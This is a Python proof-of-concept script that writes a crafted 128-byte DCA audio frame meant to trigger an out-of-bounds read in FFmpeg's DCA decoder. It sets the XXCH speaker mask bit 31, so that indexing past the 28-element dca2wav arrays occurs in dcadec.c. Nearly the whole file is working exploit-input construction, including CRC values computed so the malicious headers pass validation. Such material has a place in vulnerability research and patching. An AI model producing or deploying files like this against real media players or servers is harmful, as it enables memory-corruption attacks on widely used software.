#!/usr/bin/env python3
"""
vuln_001_gen.py: Generate a crafted DCA/CSS bitstream with XXCH extension where
xxch_spkr_mask has bit 31 set (speaker RSV4) and prim_dmix_embedded=1.

Root vulnerability: dca2wav[] arrays in dcadec.c have 28 elements (indices 0-27),
but ff_dca_set_channel_layout() iterates up to DCA_SPEAKER_COUNT=32 when the
-channel_order coded option is used, causing an OOB read at dca2wav[28..31] when
dca_mask has those high bits set.  The same root cause (missing bounds check) also
affects ff_dca_export_downmix_matrix() when output_mask has bits >=28 set.

Frame layout (128 bytes):
  0-12   : DCA core frame header (104 bits)
  13-41  : Audio coding header – 5 channels, 3F2R, sel=5 everywhere
  42-56  : Subframe header + 1 sub-sub-frame of silent audio
  57-63  : Aux-data preamble + REV1AUX sync word  (bytes 60-63 = 0x9A1105A0)
  64-77  : Aux data: prim_dmix_embedded=1, LoRo type, 10 zero coefficients + CRC
  78-79  : Padding
  80-93  : XXCH frame header (sync 0x47004A03 + 10 content bytes)
  94-109 : XXCH channel set header + sub-frame audio (speaker RSV4 = bit 31)
  110-127: Padding
"""

import os
import struct
import sys


def _build_crc16_table(poly: int = 0x1021) -> list:
    """Build CRC-16-CCITT table (non-reflected, poly=0x1021) matching FFmpeg's AV_CRC_16_CCITT."""
    table = []
    for i in range(256):
        crc = i << 8
        for _ in range(8):
            crc = ((crc << 1) & 0xFFFF) ^ poly if (crc & 0x8000) else (crc << 1) & 0xFFFF
        table.append(crc)
    return table

_CRC16_TABLE = _build_crc16_table()


def crc16_ccitt(data: bytes, init: int = 0xFFFF) -> int:
    """CRC-16-CCITT matching FFmpeg av_crc(AV_CRC_16_CCITT, 0xffff, ...).

    Appending the big-endian result of this function to the data and re-running
    with init=0xFFFF produces 0 — so av_crc(init=0xFFFF, data+result_bytes) == 0.
    """
    crc = init
    for b in data:
        crc = ((crc << 8) & 0xFFFF) ^ _CRC16_TABLE[((crc >> 8) ^ b) & 0xFF]
    return crc


class BitWriter:
    """Write bits MSB-first into a bytearray of fixed size."""

    def __init__(self, size_bytes: int):
        self.buf = bytearray(size_bytes)
        self.pos = 0

    def write(self, nbits: int, value: int) -> None:
        assert nbits > 0, "nbits must be positive"
        assert 0 <= value < (1 << nbits), (
            f"value {value:#x} does not fit in {nbits} bits"
        )
        for shift in range(nbits - 1, -1, -1):
            bit = (value >> shift) & 1
            byte_idx = self.pos >> 3
            bit_mask = 1 << (7 - (self.pos & 7))
            if bit:
                self.buf[byte_idx] |= bit_mask
            self.pos += 1

    def align_to(self, n: int) -> None:
        """Advance bit position to the next multiple of n."""
        remainder = self.pos % n
        if remainder:
            self.write(n - remainder, 0)

    def pad_to(self, target_bit: int) -> None:
        """Zero-pad up to target_bit (must not go backwards)."""
        assert target_bit >= self.pos, (
            f"pad_to({target_bit}) called at position {self.pos}"
        )
        while self.pos < target_bit:
            self.write(1, 0)

    def tell(self) -> int:
        return self.pos

    def bytes(self) -> bytes:
        return bytes(self.buf)


def make_dca_frame() -> bytes:
    """
    Construct a 128-byte DCA CSS frame containing:
      - 5-channel (3F2R) core audio
      - REV1AUX auxiliary data with prim_dmix_embedded=1
      - XXCH extension with xxch_mask_nbits=32 and xxch_spkr_mask = (1<<31)
    """
    FRAME_SIZE = 128          # bytes
    NCHANNELS_CORE = 5        # ff_dca_channels[9] = 5 for AMODE_3F2R
    NSUBBANDS = 2             # nsubbands per channel
    VQ_START = 1              # subbands [0,vq_start) are regular; [vq_start,nsubbands) are VQ
    NSUBFRAMES = 1
    NSUBSUBFRAMES = 1
    NPCMBLOCKS = 8            # 8 × 32 = 256 PCM samples per channel
    AUDIO_MODE = 9            # 3F2R  (C L R Ls Rs)
    SR_CODE = 13              # 48000 Hz (ff_dca_sample_rates[13])
    BR_CODE = 7               # arbitrary non-zero bit rate code
    EXT_AUDIO_TYPE = 6        # XXCH extension
    DCA_SPEAKER_Cs = 6        # speaker enum value for Cs; used as shift constant

    # The core ch_mask for AMODE_3F2R = DCA_SPEAKER_LAYOUT_5POINT0 = 0x1F
    # Speakers: C(bit0) L(bit1) R(bit2) Ls(bit3) Rs(bit4)
    CORE_CH_MASK = 0x0000001F

    # quant_index_sel bit-widths per codebook (DCA_CODE_BOOKS=10)
    QUANT_NBITS = [1, 2, 2, 2, 2, 3, 3, 3, 3, 3]

    bw = BitWriter(FRAME_SIZE)

    # ================================================================
    # CORE FRAME HEADER  (bits 0..103 = 13 bytes)
    # ================================================================
    bw.write(32, 0x7FFE8001)          # sync word
    bw.write(1,  1)                   # normal_frame = 1
    bw.write(5,  31)                  # deficit_samples - 1 = 31
    bw.write(1,  0)                   # crc_present = 0
    bw.write(7,  NPCMBLOCKS - 1)      # npcmblocks - 1 = 7
    bw.write(14, FRAME_SIZE - 1)      # frame_size - 1 = 127
    bw.write(6,  AUDIO_MODE)          # audio_mode = 9
    bw.write(4,  SR_CODE)             # sr_code = 13
    bw.write(5,  BR_CODE)             # br_code = 7
    bw.write(1,  0)                   # reserved = 0
    bw.write(1,  0)                   # drc_present = 0
    bw.write(1,  0)                   # ts_present = 0
    bw.write(1,  1)                   # aux_present = 1
    bw.write(1,  0)                   # hdcd_master = 0
    bw.write(3,  EXT_AUDIO_TYPE)      # ext_audio_type = 6 (XXCH)
    bw.write(1,  1)                   # ext_audio_present = 1
    bw.write(1,  0)                   # sync_ssf = 0
    bw.write(2,  0)                   # lfe_present = 0
    bw.write(1,  1)                   # predictor_history = 1
    # (crc_present=0: no CRC header words)
    bw.write(1,  0)                   # filter_perfect = 0
    bw.write(4,  0)                   # encoder_rev = 0
    bw.write(2,  0)                   # copy_hist = 0
    bw.write(3,  0)                   # pcmr_code = 0 (16-bit)
    bw.write(1,  0)                   # sumdiff_front = 0
    bw.write(1,  0)                   # sumdiff_surround = 0
    bw.write(4,  0)                   # dn_code = 0

    assert bw.tell() == 104, f"Header: expected 104, got {bw.tell()}"

    # ================================================================
    # CORE AUDIO CODING HEADER  (bits 104..335 = 29 bytes)
    # HEADER_CORE path in parse_coding_header()
    # ================================================================
    bw.write(4, NSUBFRAMES - 1)       # nsubframes - 1 = 0
    bw.write(3, NCHANNELS_CORE - 1)   # nchannels - 1 = 4

    # parse_coding_header reads fields in ALL-channels-first order (not per-channel):
    #   for all ch: nsubbands; for all ch: vq_start; for all ch: joint; etc.

    # Subband activity count: for all 5 channels
    for _ in range(NCHANNELS_CORE):
        bw.write(5, NSUBBANDS - 2)    # nsubbands - 2 = 0  → nsubbands=2

    # High frequency VQ start subband: for all 5 channels
    for _ in range(NCHANNELS_CORE):
        bw.write(5, VQ_START - 1)     # subband_vq_start - 1 = 0  → vq_start=1

    # Joint intensity coding index: for all 5 channels (0 = no joint coding)
    for _ in range(NCHANNELS_CORE):
        bw.write(3, 0)                # 0 ≤ nchannels=5  → validation passes

    # Transient mode code book: for all 5 channels
    for _ in range(NCHANNELS_CORE):
        bw.write(2, 0)                # transition_mode_sel = 0

    # Scale factor code book: for all 5 channels
    for _ in range(NCHANNELS_CORE):
        bw.write(3, 5)                # sel=5 (<7 → valid) → get_bits(6) path

    # Bit allocation quantizer select: for all 5 channels
    for _ in range(NCHANNELS_CORE):
        bw.write(3, 5)                # sel=5 (<7 → valid) → get_bits(4) path

    # quant_index_sel: for each codebook n, then for each channel
    # All set to max value (all 1 bits) → skips scale_factor_adj reading
    for n in range(10):
        for _ in range(NCHANNELS_CORE):
            max_val = (1 << QUANT_NBITS[n]) - 1
            bw.write(QUANT_NBITS[n], max_val)

    assert bw.tell() == 336, f"Coding header: expected 336, got {bw.tell()}"

    # ================================================================
    # CORE SUBFRAME HEADER  (bits 336..400)
    # parse_subframe_header(HEADER_CORE)
    # ================================================================
    bw.write(2, NSUBSUBFRAMES - 1)    # nsubsubframes - 1 = 0  → 1 sub-sub-frame
    bw.write(3, 0)                    # partial subsubframe count = 0

    # prediction_mode for each channel, each subband
    for _ in range(NCHANNELS_CORE):
        for _ in range(NSUBBANDS):
            bw.write(1, 0)            # no prediction

    # bit_allocation for regular bands (band 0 only, since vq_start=1)
    # sel=5 → reads get_bits(sel-1) = get_bits(4) directly
    for _ in range(NCHANNELS_CORE):
        bw.write(4, 0)                # abits = 0 → no quantized samples

    # transition mode: nsubsubframes=1 → no transitions → 0 bits read

    # scale_factors for VQ bands (band 1 only, since nsubbands=2, vq_start=1)
    # sel=5 → reads get_bits(sel+1) = get_bits(6) directly
    for _ in range(NCHANNELS_CORE):
        bw.write(6, 0)                # scale_index = 0 (valid: < table size)

    assert bw.tell() == 401, f"Subframe hdr: expected 401, got {bw.tell()}"

    # ================================================================
    # CORE SUBFRAME AUDIO  (bits 401..450)
    # parse_subframe_audio(HEADER_CORE)
    # ================================================================
    # VQ band indices: one per channel per VQ band (band 1 only)
    # get_bits(10) for each → index 0 is always valid
    for _ in range(NCHANNELS_CORE):
        bw.write(10, 0)               # vq_index = 0

    # abits=0 regular bands → no quantized samples to read

    # DSYNC word: required at the end of the last sub-sub-frame of audio data
    # parse_subframe_audio: `if (ssf == nsubsubframes-1 || sync_ssf) check 16-bit DSYNC`
    # With nsubsubframes=1 and sync_ssf=0: read 16 bits = 0xFFFF at ssf=0 (last/only ssf)
    bw.write(16, 0xFFFF)              # DSYNC = 0xFFFF

    assert bw.tell() == 467, f"Subframe audio: expected 467, got {bw.tell()}"

    # ================================================================
    # AUXILIARY DATA PREAMBLE
    # parse_aux_data():
    #   skip_bits(6)           → byte count field (ignored)
    #   align to 32 bits
    #   read 32-bit sync
    # ================================================================
    bw.write(6, 0)                    # aux byte count field (don't care)
    bw.align_to(32)                   # align → moves to bit 480 (byte 60)

    assert bw.tell() == 480, f"Pre-sync align: expected 480, got {bw.tell()}"

    # REV1AUX sync word at bytes 60..63
    bw.write(32, 0x9A1105A0)          # DCA_SYNCWORD_REV1AUX

    # ================================================================
    # AUXILIARY DATA CONTENT  (aux_pos = 512 = byte 64)
    # ================================================================
    # timestamp flag = 0
    bw.write(1, 0)

    # prim_dmix_embedded = 1 (trigger condition for ff_dca_export_downmix_matrix)
    bw.write(1, 1)

    # prim_dmix_type = 1 (LoRo, 3 bits)
    #   DCA_DMIX_TYPE_LoRo = 1  < DCA_DMIX_TYPE_COUNT → valid
    bw.write(3, 1)

    # Downmix coefficient matrix:
    #   m = ff_dca_dmix_primary_nch[1] = 2  (LoRo → 2 output channels)
    #   n = ff_dca_channels[9] + 0 (lfe_present=0) = 5 channels
    #   → m*n = 10 coefficients, each 9 bits
    #   9-bit code: sign = code>>8, index = code & 0xFF
    #   code=0 → sign=0, index=0 < FF_DCA_DMIXTABLE_SIZE(242) → valid
    for _ in range(10):
        bw.write(9, 0)

    # byte-align
    bw.align_to(8)

    # CRC placeholder (16 bits); ff_dca_check_crc skips unless AV_EF_CRCCHECK is set
    bw.write(16, 0)

    assert bw.tell() == 624, f"After aux data: expected 624, got {bw.tell()}"
    # Now at byte 78.  XXCH must start at a 4-byte boundary ≥ current 4-word position.
    # 4-word position = 624/32 = 19.  XXCH will be at 4-word 20 = byte 80.

    # ================================================================
    # PAD bytes 78..79 → XXCH sync at byte 80 (bit 640)
    # parse_optional_info() searches for XXCH sync from sync_pos down to last_pos:
    #   sync_pos = min(frame_size/4, size_in_bits/32) - 1 = min(32,32)-1 = 31
    #   last_pos = get_bits_count()/32 = 624/32 = 19
    #   word 20 (byte 80) contains 0x47004A03 → match found, xxch_pos = 640
    # ================================================================
    bw.pad_to(640)                    # → byte 80

    # ================================================================
    # XXCH FRAME HEADER  (bytes 80..93 = 14 bytes)
    # parse_xxch_frame()
    # ================================================================
    bw.write(32, 0x47004A03)          # DCA_SYNCWORD_XXCH  (bits 640..671)

    # XXCH frame header content (bits 672..751 = 80 bits = 10 bytes)
    # header_size_field (6 bits): 13  → header_size = 14 bytes
    bw.write(6,  13)
    # xxch_crc_present (1 bit): 0  → CRC check in parse_coding_header skipped
    bw.write(1,  0)
    # xxch_mask_nbits - 1 (5 bits): 31  → xxch_mask_nbits = 32
    bw.write(5,  31)
    # xxch_nchsets - 1 (2 bits): 0  → 1 channel set
    bw.write(2,  0)
    # xxch_frame_size - 1 (14 bits): 15  → 16 bytes of channel set data
    bw.write(14, 15)
    # xxch_core_mask (xxch_mask_nbits=32 bits): must equal s->ch_mask after Ls/Rs remapping
    #   For 3F2R with no Lss/Rss in core mask → mask stays 0x1F → must match 0x1F
    bw.write(32, CORE_CH_MASK)        # 0x0000001F

    # Padding: 4 reserved bits (bits 732..735 = bytes 91 bits 4..7)
    bw.write(4, 0)

    # CRC-16-CCITT of bytes 84..91 (header content from after sync word).
    # FFmpeg's XXCH sync detection: av_crc(0xFFFF, buffer+84, size-4) must == 0.
    # For CRC-16-CCITT: appending big-endian CRC to the message gives residue 0.
    xxch_hdr_bytes = bw.bytes()[84:92]    # bytes 84..91 (8 bytes)
    xxch_hdr_crc = crc16_ccitt(xxch_hdr_bytes)
    bw.write(16, xxch_hdr_crc)            # bits 736..751 = bytes 92..93

    assert bw.tell() == 752, f"XXCH frame hdr: expected 752, got {bw.tell()}"

    # ================================================================
    # XXCH CHANNEL SET HEADER  (bits 752..839 = header_size=11 bytes)
    # parse_coding_header(HEADER_XXCH, xch_base=5)
    # ================================================================
    # header_size_field (7 bits): 10  → channel-set header_size = 11 bytes
    bw.write(7, 10)
    # nchannels - 1 (3 bits): 0  → nchannels = 1  →  total s->nchannels = 6
    bw.write(3, 0)

    # Loudspeaker layout mask: (xxch_mask_nbits - DCA_SPEAKER_Cs) = 26 bits
    # Desired xxch_spkr_mask = (1 << 31)  (speaker RSV4, speaker index 31)
    # mask_field = xxch_spkr_mask >> DCA_SPEAKER_Cs = (1<<31) >> 6 = (1<<25)
    # av_popcount((1<<31)) = 1 = nchannels  → validation passes
    # 0x1F & 0x80000000 = 0  → no collision with core mask
    SPKR_MASK_FIELD = 1 << 25        # 26 bits wide, MSB set
    bw.write(26, SPKR_MASK_FIELD)

    # downmix coefficients present = 0
    bw.write(1, 0)

    # Per-channel (ch=5, 1 new channel):
    bw.write(5, NSUBBANDS - 2)        # nsubbands - 2 = 0
    bw.write(5, VQ_START - 1)         # subband_vq_start - 1 = 0
    bw.write(3, 0)                    # joint_intensity_index = 0
    bw.write(2, 0)                    # transition_mode_sel = 0
    bw.write(3, 5)                    # scale_factor_sel = 5
    bw.write(3, 5)                    # bit_allocation_sel = 5

    # quant_index_sel for ch=5 (same layout as core channels)
    for n in range(10):
        max_val = (1 << QUANT_NBITS[n]) - 1
        bw.write(QUANT_NBITS[n], max_val)

    # Seek to end of 11-byte channel-set header: 752 + 11*8 = 840
    bw.pad_to(840)

    assert bw.tell() == 840, f"XXCH ch-set hdr: expected 840, got {bw.tell()}"

    # ================================================================
    # XXCH SUBFRAME HEADER  (bits 840..)
    # parse_subframe_header(HEADER_XXCH, xch_base=5)
    # nsubsubframes inherited from CORE parse = 1
    # ================================================================
    # prediction_mode for each subband of ch=5 (bands 0 and 1)
    bw.write(1, 0)                    # band 0: no prediction
    bw.write(1, 0)                    # band 1: no prediction

    # bit_allocation for regular bands (band 0, before vq_start=1)
    # sel=5 → get_bits(4) directly
    bw.write(4, 0)                    # abits = 0

    # scale_factor for VQ bands (band 1)
    # sel=5 → get_bits(6)
    bw.write(6, 0)                    # scale_index = 0 (valid)

    # ================================================================
    # XXCH SUBFRAME AUDIO  (parse_subframe_audio(HEADER_XXCH, xch_base=5))
    # ================================================================
    # VQ band index for band 1 of ch=5: get_bits(10)
    bw.write(10, 0)                   # vq_index = 0 (always valid)

    # DSYNC: parse_subframe_audio checks at end of last ssf (ssf=0 = last since nsubsubframes=1)
    # regular band data for ch=5 band 0 (abits=0) = no bits; DSYNC follows immediately
    bw.write(16, 0xFFFF)              # DSYNC = 0xFFFF

    # parse_xxch_frame() then seeks to:
    #   header_pos + (header_size + xxch_frame_size)*8 = 640 + (14+16)*8 = 880
    bw.pad_to(880)

    # Remainder of frame is zero padding
    assert bw.tell() == 880
    # bytes 110..127 remain zero from BitWriter initialisation

    frame = bw.bytes()
    assert len(frame) == FRAME_SIZE, f"Frame size mismatch: {len(frame)}"
    return frame


if __name__ == "__main__":
    frame = make_dca_frame()

    script_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(script_dir, "vuln_001_input.dca")

    with open(out_path, "wb") as f:
        f.write(frame)

    print(f"[+] Generated {out_path}  ({len(frame)} bytes)")
    print("[+] Hex dump:")
    for i in range(0, len(frame), 16):
        chunk = frame[i : i + 16]
        hex_str = " ".join(f"{b:02x}" for b in chunk)
        asc_str = "".join(chr(b) if 0x20 <= b < 0x7F else "." for b in chunk)
        print(f"    {i:4d}: {hex_str:<47}  {asc_str}")
    print("[+] Key offsets:")
    print(f"    byte  0: DCA sync word (0x7FFE8001)")
    print(f"    byte 60: REV1AUX sync word (0x9A1105A0) → prim_dmix_embedded=1")
    print(f"    byte 80: XXCH sync word (0x47004A03) → xxch_mask_nbits=32")
    print(f"    byte 94: XXCH channel set → xxch_spkr_mask=0x80000000 (bit 31 = RSV4)")
